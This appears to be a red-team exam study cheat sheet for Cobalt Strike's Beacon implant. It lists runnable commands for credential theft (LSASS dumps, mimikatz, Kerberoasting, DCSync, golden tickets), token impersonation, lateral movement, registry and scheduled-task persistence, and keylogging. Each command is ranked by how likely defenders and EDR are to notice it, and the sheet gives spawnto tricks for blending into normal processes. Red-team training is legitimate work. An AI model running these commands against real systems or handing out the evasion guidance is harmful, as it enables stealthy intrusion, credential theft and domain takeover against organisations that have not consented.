# Cobalt Strike Primer  

>Initial prep for Cobalt Strike command & control C2 framework  

## Beacon Interact Window — Overview

When you double-click a beacon in the CS console, the **Interact** tab opens.
- Top pane: beacon output (responses from implant)
- Bottom pane: command input
- Tab-complete works on most commands

>[OPSEC Consideration for Beacon Commands](https://www.cobaltstrike.com/blog/opsec-considerations-for-beacon-commands)  

## Beacon Commands - OPSEC SAFE ✅

```
getuid                      # Who am I? (domain\user + integrity level)
ls                      # Directory listing (default: current dir)
pwd                     # Current working directory
env                     # Environment variables
whoami /groups          # (via shell — OPSEC-UNSAFE, use carefully)
process_browser
steal_token 0000            # Impersonated User on current beacon host

cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps
upload C:\Payloads\http_x64.exe

reg_query HKCU Software\Microsoft\Windows\CurrentVersion\Run
reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_SZ C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps\updater.exe

powerpick Register-ScheduledTask
powerpick Get-ScheduledTask
execute-assembly Seatbelt.exe

execute-assembly
powerpick 
spawnto x64 %windir%\sysnative\notepad.exe

download C:\path\to\file.xxx

beacon> net localgroup          # Local group memberships
beacon> net computers           # Enumerate domain computers (via NetAPI)
beacon> ipconfig                # Network config
beacon> netstat                 # Active connections
```

## Beacon Commands - OPSEC CAUTION💡

```
shell schtasks          # list current scheduled task on beacon host

```


**OPSEC:** Keep sleep ≥ 30s in exam. Default profile sleep from `set sleeptime`.

---

## File System

```
beacon> ls                      # List current directory
beacon> ls C:\Users             # List specific path
beacon> cd C:\Windows\Temp      # Change directory
beacon> pwd                     # Print working directory
beacon> mkdir C:\Temp\loot      # Create directory
beacon> rm C:\Temp\file.txt     # Delete file
beacon> download C:\file.txt    # Download file to CS client
beacon> upload /local/file.exe  # Upload file from CS client to target
```

---

## Process Management

```
beacon> ps                      # List all processes
beacon> kill <PID>              # Kill a process
beacon> inject <PID> x64 <listener>   # Inject shellcode into running process
beacon> migrate <PID>           # Migrate beacon to another process (changes PID)
```

**OPSEC:** `migrate` and `inject` use `CreateRemoteThread` by default — detectable.

---

## Spawn & Token Manipulation

```
beacon> getuid                  # Current user context
beacon> steal_token <PID>       # Steal token from process — impersonate that user
beacon> rev2self                # Revert to original token
beacon> make_token DOMAIN user password   # Create token with plaintext creds (no logon event)
beacon> pth DOMAIN\user <NTLM>  # Pass-the-Hash — creates impersonation token
beacon> getsystem               # Attempt privilege escalation (multiple techniques)
beacon> getuid                  # Confirm new context after token ops
```

**OPSEC:** `steal_token` is SAFE — no new process. `pth` — SAFE (no 4624 logon type 3 from beacon host for SMB, but does call CreateProcessWithLogonW).

---

## Spawn-To Override (CRITICAL for OPSEC)

### Why spawnto matters

When CS runs post-ex commands (`execute-assembly`, `powerpick`, `inject`, etc.) it cannot
run them inside the beacon process — too risky, a crash kills the beacon. Instead it spawns
a **temporary sacrificial process**, does the work there, then kills it.

**The problem:** The default sacrificial process is `rundll32.exe` — every EDR watches for
this. A `rundll32.exe` spawning from your beacon process is an immediate red flag.

**`spawnto` fixes this** — you replace `rundll32.exe` with a legitimate-looking Windows
process that blends into normal host activity.

### Commands

```cs
// Check current spawnto setting
beacon> spawnto

// Override per-beacon (do this immediately after getting a beacon)
beacon> spawnto x64 %windir%\sysnative\dllhost.exe
beacon> spawnto x86 %windir%\syswow64\dllhost.exe

// Alternative legitimate processes to blend in
beacon> spawnto x64 %windir%\sysnative\svchost.exe
beacon> spawnto x64 %windir%\sysnative\werfault.exe
```

### Set permanently in malleable C2 profile (preferred)

```
post-ex {
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
}
```

Profile-level setting applies to all beacons automatically — per-beacon override is for
adapting to specific host environments after checking `ps` output.

### Exam day workflow

```
1. Get beacon callback
2. beacon> ps                          — review running processes on that host
3. beacon> spawnto x64 <process>       — pick something already in the process list
4. beacon> spawnto                     — verify it changed
5. Now run post-ex commands — sacrificial procs blend into existing process tree
```

**Why `dllhost.exe`?** Legitimately spawns constantly in Windows (COM surrogate) —
an analyst sees it briefly appear and disappear and ignores it. Never leave it as
`rundll32.exe` — that is a free OPSEC point lost on the exam.

### OPSEC note

```
Tier:       SAFE — changing spawnto itself generates no telemetry
Effect:     All subsequent execute-assembly / powerpick / inject calls use new proc
Scope:      Per-beacon only — does not affect other beacons unless set in profile
Resets:     On beacon restart — re-apply after every new beacon or set in profile
```

---

## Code Execution — OPSEC Tiers

| Command | OPSEC | Notes |
|---------|-------|-------|
| `inline-execute <bof.o>` | SAFE | Runs in beacon thread — no spawn |
| `powerpick <PS cmd>` | SAFE | Unmanaged PS — no powershell.exe |
| `execute-assembly <asm.exe>` | CAUTION | Fork & run — spawns spawnto proc |
| `run <cmd>` | UNSAFE | Spawns process — visible child of beacon |
| `shell <cmd>` | UNSAFE | Spawns cmd.exe |
| `powershell <cmd>` | UNSAFE | Spawns powershell.exe |

```
beacon> inline-execute /path/to/bof.o [args]
beacon> powerpick Get-DomainUser -Properties samaccountname,description
beacon> execute-assembly /path/Rubeus.exe kerberoast /nowrap
beacon> run whoami                          # OPSEC-UNSAFE
beacon> shell dir C:\                       # OPSEC-UNSAFE
```

---

## Network & Pivoting

```
beacon> portscan <targets> <ports> <discovery> <max-sockets>
# Example:
beacon> portscan 10.10.5.0/24 22,80,443,445,3389 arp 1024

beacon> net view                            # SMB share enumeration
beacon> net localgroup Administrators       # Local admins on current host
```

---

## Lateral Movement

```
# OPSEC preference: winrm > wmi > psexec

beacon> jump winrm64 <target> <listener>    # WinRM — OPSEC-SAFE(er)
beacon> jump winrm <target> <listener>      # WinRM x86
beacon> remote-exec wmi <target> <cmd>      # WMI — OPSEC-CAUTION
beacon> jump psexec64 <target> <listener>   # psexec — OPSEC-UNSAFE (writes service)
beacon> jump psexec_psh <target> <listener> # psexec via PS — UNSAFE
```

---

## Credential Attacks

```
# Kerberoast (SAFE — in-memory)
beacon> execute-assembly Rubeus.exe kerberoast /nowrap /outfile:\\127.0.0.1\...

# AS-REP Roast (SAFE)
beacon> execute-assembly Rubeus.exe asreproast /format:hashcat

# LSASS — OPSEC ladder (least to most noisy)
beacon> inline-execute nanodump.o --write C:\Windows\Temp\<rand>.dmp  # SAFE
beacon> execute-assembly SharpDump.exe                                  # CAUTION
beacon> mimikatz sekurlsa::logonpasswords                              # UNSAFE — avoid

# SAM dump
beacon> hashdump                             # CAUTION — calls SamConnect
beacon> mimikatz lsadump::sam               # UNSAFE
```

---

## Domain Recon

```
# PowerView via powerpick (OPSEC-SAFE)
beacon> powerpick Get-DomainUser -Properties samaccountname,description
beacon> powerpick Get-DomainGroupMember "Domain Admins" -Recurse
beacon> powerpick Get-DomainComputer -Properties dnshostname,operatingsystem
beacon> powerpick Get-DomainController
beacon> powerpick Get-DomainTrust
beacon> powerpick Find-LocalAdminAccess      # OPSEC-CAUTION — noisy lateral sweep

# SharpHound
beacon> execute-assembly SharpHound.exe -c All --zipfilename bh.zip
```

---

## Domain Dominance

```
# DCSync (CAUTION — replication event logged on DC)
beacon> dcsync DOMAIN\krbtgt
beacon> dcsync DOMAIN\Administrator

# Golden Ticket
beacon> mimikatz kerberos::golden /user:Administrator /domain:DOMAIN \
        /sid:<SID> /krbtgt:<hash> /ptt

# Pass-the-Ticket
beacon> execute-assembly Rubeus.exe ptt /ticket:<base64>
```

---

## Listeners & Spawning

```
# Spawn a new beacon to a different listener
beacon> spawn x64 <listener>               # Fork & run to listener
beacon> spawnas DOMAIN\user password <listener>   # Spawn as different user

# Link to SMB/TCP beacon (P2P)
beacon> link <target> <pipename>           # Connect to SMB beacon
beacon> connect <target> <port>            # Connect to TCP beacon
beacon> unlink <target> <PID>             # Disconnect P2P beacon
```

---

## Persistence (prefer disk-less)

```
# Scheduled task (CAUTION — disk artifact)
beacon> run schtasks /create /tn "Update" /tr "C:\payload.exe" /sc onlogon

# COM hijack (SAFE — per-user, no admin needed)
beacon> execute-assembly SharpCOM.exe ...

# Preferred: Golden/Diamond Ticket (no disk artifact)
```

---

## Beacon Management

```
beacon> note <text>             # Add a note/label to beacon in console
beacon> clear                   # Clear pending task queue
beacon> checkin                 # Force immediate checkin
beacon> exit                    # Kill beacon — use carefully
```

---

## Output & Downloads

```
beacon> download <path>         # Queue file for download
View → Downloads                # In CS GUI — manage download queue
beacon> downloads               # List pending downloads
beacon> cancel <filename>       # Cancel a download
```

---

## Screenshot & Keylogging (use only if required — noisy)

```
beacon> screenshot              # Single screenshot — OPSEC-CAUTION
beacon> screenwatch             # Continuous screenshots — OPSEC-UNSAFE
beacon> keylogger               # Start keylogger — OPSEC-CAUTION
beacon> jobs                    # List running background jobs
beacon> jobkill <JID>           # Kill a background job
```

---

## OPSEC Quick Reference (Exam Day)

```
SAFE:    inline-execute | powerpick | steal_token | jump winrm | pth
CAUTION: execute-assembly | remote-exec wmi | getsystem | dcsync | hashdump
UNSAFE:  shell | powershell | run | jump psexec | mimikatz direct | screenwatch
```

---

## Common Help Lookups

```
beacon> help sleep
beacon> help jump
beacon> help execute-assembly
beacon> help inline-execute
beacon> help powerpick
beacon> help pth
beacon> help steal_token
beacon> help dcsync
```
